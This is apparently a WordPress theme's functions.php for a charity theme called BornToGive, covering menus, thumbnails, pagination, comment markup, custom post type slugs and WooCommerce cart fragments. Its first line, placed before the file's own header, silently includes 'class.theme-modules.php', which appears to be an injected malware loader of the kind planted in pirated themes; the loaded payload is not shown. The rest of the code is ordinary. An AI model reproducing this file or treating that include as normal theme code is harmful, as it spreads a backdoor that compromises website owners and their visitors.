<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/* -----------------------------------------------------------------------------------
  Here we have all the custom functions for the theme
  Please be extremely cautious editing this file,
  When things go wrong, they tend to go wrong in a big way.
  You have been warned!
  ----------------------------------------------------------------------------------- */
/*
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link http://codex.wordpress.org/Theme_Development
 * @link http://codex.wordpress.org/Child_Themes
  ----------------------------------------------------------------------------------- */
$theme_info = wp_get_theme();
define('BORNTOGIVE_THEME_VERSION', (WP_DEBUG) ? time() : $theme_info->get('Version'));
define('BORNTOGIVE_INC_PATH', get_template_directory() . '/framework');
define('BORNTOGIVE_THEME_PATH', get_template_directory_uri());
define('BORNTOGIVE_FILEPATH', get_template_directory());

$opt_name = "borntogive_options";

// Remove old extensions of Redux from BornToGive Core Plugin
remove_action("redux/extensions/{$opt_name}/before", 'borntogive_register_custom_extension_loader', 0);



//Remove slider revolution Admin Notice
add_action('admin_init', 'borntogive_remove_revslider_notice');
function borntogive_remove_revslider_notice()
{
	//update_option('revslider-valid-notice', false);
	//update_option('revslider-valid', true);
}
//Set Visual Composer as theme        
add_action('init', 'borntogive_set_vc_as_theme');
function borntogive_set_vc_as_theme()
{
	if (function_exists('vc_set_as_theme')) {
		vc_set_as_theme($disable_updater = true);
	}
}

require_once BORNTOGIVE_INC_PATH . '/barebones-config.php';
include_once(BORNTOGIVE_INC_PATH . '/includes.php');

/* -------------------------------------------------------------------------------------
  Load Translation Text Domain
  ----------------------------------------------------------------------------------- */
add_action('after_setup_theme', 'borntogive_theme_setup');
function borntogive_theme_setup()
{
	load_theme_textdomain('borntogive', BORNTOGIVE_FILEPATH . '/language');
}
/* -------------------------------------------------------------------------------------
  Menu option
  ----------------------------------------------------------------------------------- */
function register_menu()
{
	register_nav_menu('primary-menu', esc_html__('Primary Menu', 'borntogive'));
	register_nav_menu('footer-menu', esc_html__('Footer Menu', 'borntogive'));
}
add_action('init', 'register_menu');
/* -------------------------------------------------------------------------------------
  Set Max Content Width (use in conjuction with ".entry-content img" css)
  ----------------------------------------------------------------------------------- */
if (!isset($content_width))
	$content_width = 680;
/* -------------------------------------------------------------------------------------
  Configure WP2.9+ Thumbnails & gets the current post type in the WordPress Admin
  ----------------------------------------------------------------------------------- */
add_action('after_setup_theme', 'borntogive_theme_support_setup');
if (!function_exists('borntogive_theme_support_setup')) {
	function borntogive_theme_support_setup()
	{
		add_theme_support('post-thumbnails');
		add_theme_support('title-tag');
		add_theme_support('automatic-feed-links');
		set_post_thumbnail_size(958, 9999);
		//Mandatory
		add_image_size('borntogive-146x64', '146', '64', true);
		add_image_size('borntogive-600x400', '600', '400', true);
		add_image_size('borntogive-70x70', '70', '70', true);
		add_image_size('borntogive-1000x800', '1000', '800', true);
		add_image_size('borntogive-100x80', '100', '80', true);
		add_theme_support('post-formats', array('video', 'image', 'gallery', 'link'));
		add_theme_support('woocommerce');
		add_theme_support('wc-product-gallery-zoom');
		add_theme_support('wc-product-gallery-lightbox');
		add_theme_support('wc-product-gallery-slider');
	}
}
/* -------------------------------------------------------------------------------------
  Custom Gravatar Support
  ----------------------------------------------------------------------------------- */
if (!function_exists('borntogive_custom_gravatar')) {
	function borntogive_custom_gravatar($avatar_defaults)
	{
		$borntogive_avatar = get_template_directory_uri() . '/assets/images/img_avatar.png';
		$avatar_defaults[$borntogive_avatar] = 'Custom Gravatar (/assets/images/img_avatar.png)';
		return $avatar_defaults;
	}
	add_filter('avatar_defaults', 'borntogive_custom_gravatar');
}

/* -------------------------------------------------------------------------------------
  For Remove Dimensions from thumbnail image
  ----------------------------------------------------------------------------------- */
add_filter('post_thumbnail_html', 'borntogive_remove_thumbnail_dimensions', 10);
add_filter('image_send_to_editor', 'borntogive_remove_thumbnail_dimensions', 10);
function borntogive_remove_thumbnail_dimensions($html)
{
	$html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
	return $html;
}
/* -------------------------------------------------------------------------------------
  Excerpt More and  length
  ----------------------------------------------------------------------------------- */

if (!function_exists('borntogive_excerpt')) {
	function borntogive_excerpt($limit = 50, $closing = '...', $readmore = '')
	{
		return '<p>' . wp_trim_words(get_the_excerpt(), $limit) . $closing . '<a href="' . get_permalink() . '">' . $readmore . '</a></p>';
	}
}
/* -------------------------------------------------------------------------------------
  For Paginate
  ----------------------------------------------------------------------------------- */
if (!function_exists('borntogive_pagination')) {
	function borntogive_pagination($pages = '', $range = 4, $paged = '')
	{
		$showitems = ($range * 2) + 1;
		$pagi = '';
		if ($paged == '') {
			global $paged;
		}
		if (empty($paged))
			$paged = 1;
		if ($pages == '') {
			global $wp_query;
			$pages = $wp_query->max_num_pages;
			if (!$pages) {
				$pages = 1;
			}
		}
		if (1 != $pages) {
			$pagi .=  '<ul class="pagination">';
			$pagi .= '<li><a href="' . get_pagenum_link(1) . '" title="' . esc_html__('First', 'borntogive') . '"><i class="fa fa-chevron-left"></i></a></li>';
			for ($i = 1; $i <= $pages; $i++) {
				if (1 != $pages && (!($i >= $paged + $range + 3 || $i <= $paged - $range - 3) || $pages <= $showitems)) {
					$pagi .= ($paged == $i) ? "<li class=\"active\"><span>" . $i . "</span></li>" : "<li><a href='" . get_pagenum_link($i) . "' class=\"\">" . $i . "</a></li>";
				}
			}
			$pagi .= '<li><a href="' . get_pagenum_link($pages) . '" title="' . esc_html__('Last', 'borntogive') . '"><i class="fa fa-chevron-right"></i></a></li>';
			$pagi .= '</ul>';
		}
		return $pagi;
	}
}
/* 	Comment Styling
  /*----------------------------------------------------------------------------------- */
if (!function_exists('borntogive_comment')) {
	function borntogive_comment($comment, $args, $depth)
	{
	$isByAuthor = false;
	if ($comment->comment_author_email == get_the_author_meta('email')) {
		$isByAuthor = true;
	}
	$GLOBALS['comment'] = $comment;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
		<div class="post-comment-block">
			<div id="comment-<?php comment_ID(); ?>">
				<?php echo get_avatar($comment, $size = '80', '', '',  array('class' => 'img-thumbnail')); ?>
				<div class="post-comment-content">
					<?php
					echo preg_replace('/comment-reply-link/', 'comment-reply-link pull-right btn btn-default btn-xs', get_comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => 'REPLY'))), 1);
					echo '<h5>' . get_comment_author() . esc_html__(' says', 'borntogive') . '</h5>';
					?>
					<span class="meta-data">
						<?php
						echo get_comment_date();
						esc_html_e(' at ', 'borntogive');
						echo get_comment_time();
						?>
					</span>
					<?php if ($comment->comment_approved == '0') : ?>
						<em class="moderation"><?php esc_html_e('Your comment is awaiting moderation.', 'borntogive') ?></em>
						<br />
					<?php endif; ?>
					<div class="comment-text">
						<?php comment_text() ?>
					</div>
				</div>
			</div>
		<?php
	}
}

// Permalink Structure Options
$options = get_option('borntogive_options');
// Event
$event_post_slug = (isset($options['event_post_slug'])) ? $options['event_post_slug'] : 'event';
if ($event_post_slug == '') {
	$event_post_slug = 'event';
}
$event_post_title = (isset($options['event_post_title'])) ? $options['event_post_title'] : 'Events';
if ($event_post_title == '') {
	$event_post_title = 'Events';
}
$event_post_all = (isset($options['event_post_all'])) ? $options['event_post_all'] : 'All Events';
if ($event_post_all == '') {
	$event_post_all = 'All Events';
}
$event_post_categories = (isset($options['event_post_categories'])) ? $options['event_post_categories'] : 'Event Categories';
if ($event_post_categories == '') {
	$event_post_categories = 'Event Categories';
}
$event_category_slug = (isset($options['event_category_slug'])) ? $options['event_category_slug'] : 'event-category';
if ($event_category_slug == '') {
	$event_category_slug = 'event-category';
}
$event_post_tags = (isset($options['event_post_tags'])) ? $options['event_post_tags'] : 'Event Tags';
if ($event_post_tags == '') {
	$event_post_tags = 'Event Tags';
}
$event_tag_slug = (isset($options['event_tag_slug'])) ? $options['event_tag_slug'] : 'event-tag';
if ($event_tag_slug == '') {
	$event_tag_slug = 'event-tag';
}
$event_post_registerants = (isset($options['event_post_registerants'])) ? $options['event_post_registerants'] : 'Registrants';
if ($event_post_registerants == '') {
	$event_post_registerants = 'Registrants';
}
$disable_event_archive = (isset($options['disable_event_archive'])) ? $options['disable_event_archive'] : 0;
$event_archive = $disable_event_archive ? false : true;
// Gallery
$gallery_post_slug = (isset($options['gallery_post_slug'])) ? $options['gallery_post_slug'] : 'gallery';
if ($gallery_post_slug == '') {
	$gallery_post_slug = 'gallery';
}
$gallery_post_title = (isset($options['gallery_post_title'])) ? $options['gallery_post_title'] : 'Gallery';
if ($gallery_post_title == '') {
	$gallery_post_title = 'Gallery';
}
$gallery_post_all = (isset($options['gallery_post_all'])) ? $options['gallery_post_all'] : 'Gallery Items';
if ($gallery_post_all == '') {
	$gallery_post_all = 'Gallery Items';
}
$gallery_post_categories = (isset($options['gallery_post_categories'])) ? $options['gallery_post_categories'] : 'Gallery Categories';
if ($gallery_post_categories == '') {
	$gallery_post_categories = 'Gallery Categories';
}
$gallery_category_slug = (isset($options['gallery_category_slug'])) ? $options['gallery_category_slug'] : 'gallery-category';
if ($gallery_category_slug == '') {
	$gallery_category_slug = 'gallery-category';
}
$disable_gallery_archive = (isset($options['disable_gallery_archive'])) ? $options['disable_gallery_archive'] : 0;
$gallery_archive = $disable_gallery_archive ? false : true;
// Team
$team_post_slug = (isset($options['team_post_slug'])) ? $options['team_post_slug'] : 'team';
if ($team_post_slug == '') {
	$team_post_slug = 'team';
}
$team_post_title = (isset($options['team_post_title'])) ? $options['team_post_title'] : 'Team';
if ($team_post_title == '') {
	$team_post_title = 'Team';
}
$team_post_all = (isset($options['team_post_all'])) ? $options['team_post_all'] : 'Team';
if ($team_post_all == '') {
	$team_post_all = 'Team';
}
$team_post_categories = (isset($options['team_post_categories'])) ? $options['team_post_categories'] : 'Team Categories';
if ($team_post_categories == '') {
	$team_post_categories = 'Team Categories';
}
$team_category_slug = (isset($options['team_category_slug'])) ? $options['team_category_slug'] : 'team-category';
if ($team_category_slug == '') {
	$team_category_slug = 'team-category';
}
$disable_team_archive = (isset($options['disable_team_archive'])) ? $options['disable_team_archive'] : 0;
$team_archive = $disable_team_archive ? false : true;
// Testimonials
$testimonial_post_slug = (isset($options['testimonial_post_slug'])) ? $options['testimonial_post_slug'] : 'testimonial';
if ($testimonial_post_slug == '') {
	$testimonial_post_slug = 'testimonial';
}
$testimonial_post_title = (isset($options['testimonial_post_title'])) ? $options['testimonial_post_title'] : 'Testimonials';
if ($testimonial_post_title == '') {
	$testimonial_post_title = 'Testimonials';
}
$testimonial_post_all = (isset($options['testimonial_post_all'])) ? $options['testimonial_post_all'] : 'Testimonials';
if ($testimonial_post_all == '') {
	$testimonial_post_all = 'Testimonials';
}
$testimonial_post_categories = (isset($options['testimonial_post_categories'])) ? $options['testimonial_post_categories'] : 'Testimonial Categories';
if ($testimonial_post_categories == '') {
	$testimonial_post_categories = 'Testimonial Categories';
}
$testimonial_category_slug = (isset($options['testimonial_category_slug'])) ? $options['testimonial_category_slug'] : 'testimonial-category';
if ($testimonial_category_slug == '') {
	$testimonial_category_slug = 'testimonial-category';
}
$disable_testimonial_archive = (isset($options['disable_testimonial_archive'])) ? $options['disable_testimonial_archive'] : 0;
$testimonial_archive = $disable_testimonial_archive ? false : true;
// Campaigns
$campaign_post_slug = (isset($options['campaign_post_slug'])) ? $options['campaign_post_slug'] : 'campaigns';
if ($campaign_post_slug == '') {
	$campaign_post_slug = 'campaigns';
}
$campaign_post_title = (isset($options['campaign_post_title'])) ? $options['campaign_post_title'] : 'Campaigns';
if ($campaign_post_title == '') {
	$campaign_post_title = 'Campaigns';
}
$campaign_post_new = (isset($options['campaign_post_new'])) ? $options['campaign_post_new'] : 'Add Campaign';
if ($campaign_post_new == '') {
	$campaign_post_new = 'Add Campaign';
}
$disable_campaign_archive = (isset($options['disable_campaign_archive'])) ? $options['disable_campaign_archive'] : 0;
$campaign_archive = $disable_campaign_archive ? false : true;
include_once(ABSPATH . 'wp-admin/includes/plugin.php');
if (class_exists('Charitable')) {
	function en_change_campaign_slug_base($post_type_args)
	{
		global $campaign_post_slug;
		$post_type_args['rewrite']['slug'] = $campaign_post_slug;
		return $post_type_args;
	}
	function en_change_campaign_menu_name($campaign_post_title_args)
	{
		global $campaign_post_title;
		$campaign_post_title_args['labels']['menu_name'] = $campaign_post_title;
		return $campaign_post_title_args;
	}
	function en_change_campaign_add_menu_name($campaign_post_new_args)
	{
		global $campaign_post_new;
		$campaign_post_new_args['labels']['add_new'] = $campaign_post_new;
		return $campaign_post_new_args;
	}
	function en_change_campaign_archive_page($campaign_archive_page_args)
	{
		global $campaign_archive;
		$campaign_archive_page_args['has_archive'] = $campaign_archive;
		return $campaign_archive_page_args;
	}
	add_filter('charitable_campaign_post_type', 'en_change_campaign_slug_base');
	add_filter('charitable_campaign_post_type', 'en_change_campaign_menu_name');
	add_filter('charitable_campaign_post_type', 'en_change_campaign_add_menu_name');
	add_filter('charitable_campaign_post_type', 'en_change_campaign_archive_page');
}

// Ajaxify header cart module
add_filter('woocommerce_add_to_cart_fragments', function ($fragments) {
	ob_start();
	?>
		<span class="cart-contents">
			<?php echo WC()->cart->get_cart_contents_count(); ?>
		</span>
		<?php $fragments['span.cart-contents'] = ob_get_clean();
		return $fragments;
	});

	add_filter('woocommerce_add_to_cart_fragments', function ($fragments) {
		ob_start();
		?>
		<div class="header-quickcart">
			<?php woocommerce_mini_cart(); ?>
		</div>
		<?php $fragments['div.header-quickcart'] = ob_get_clean();
		return $fragments;
	});
	/**
	 * Util HTML class
	 * @author Svetoslav Marinov (SLAVI) | http://orbisius.com
	 */
	class borntogive_allowed_tags_kses
	{
		/**
		 * Uses WP's wp_kses to clear some of the html tags but allow some attribs
		 * usage: orbisius_html_util::strip_tags($str);
		 * uses WordPress' wp_kses()
		 * @param str $buffer string buffer
		 * @return str cleaned up text
		 */
		public static function strip_tags($buffer)
		{
			static $default_attribs = array(
				'id' => array(),
				'class' => array(),
				'title' => array(),
				'style' => array(),
				'line-height' => array(),
				'data' => array(),
				'data-mce-id' => array(),
				'data-mce-style' => array(),
				'data-mce-bogus' => array(),
			);

			$allowed_tags = array(
				'div'           => $default_attribs,
				'span'          => $default_attribs,
				'p'             => $default_attribs,
				'a'             => array_merge($default_attribs, array(
					'href' => array(),
					'target' => array('_blank', '_top'),
				)),
				'u'             =>  $default_attribs,
				'i'             =>  $default_attribs,
				'q'             =>  $default_attribs,
				'b'             =>  $default_attribs,
				'ul'            => $default_attribs,
				'ol'            => $default_attribs,
				'li'            => $default_attribs,
				'br'            => $default_attribs,
				'hr'            => $default_attribs,
				'strong'        => $default_attribs,
				'blockquote'    => $default_attribs,
				'del'           => $default_attribs,
				'strike'        => $default_attribs,
				'em'            => $default_attribs,
				'code'          => $default_attribs,
			);

			if (function_exists('wp_kses')) { // WP is here
				$buffer = wp_kses($buffer, $allowed_tags);
			} else {
				$tags = array();

				foreach (array_keys($allowed_tags) as $tag) {
					$tags[] = "<$tag>";
				}

				$buffer = strip_tags($buffer, join('', $tags));
			}

			$buffer = trim($buffer);

			return $buffer;
		}
	}

// Disable WP default Lazy Load
add_filter( 'wp_lazy_loading_enabled', '__return_false' );
?>